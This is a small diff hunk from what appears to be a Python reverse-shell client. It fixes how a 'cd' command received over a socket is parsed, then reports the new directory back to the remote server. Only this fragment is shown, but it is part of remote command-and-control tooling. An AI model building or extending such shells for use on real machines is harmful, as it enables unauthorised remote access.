@@ -115,7 +115,8 @@ def shell(mySocket):
         #and explicitly tell the operating system to change the directory
         elif 'cd' == commandList[0]:
             try:
-                code, directory = command.decode().split(" ", 1)
+                directory = ' '.join(commandList[1:])
+
                 os.chdir(directory)
                 informToServer = "[+] Current working directory is " + os.getcwd()
                 mySocket.send(informToServer.encode())
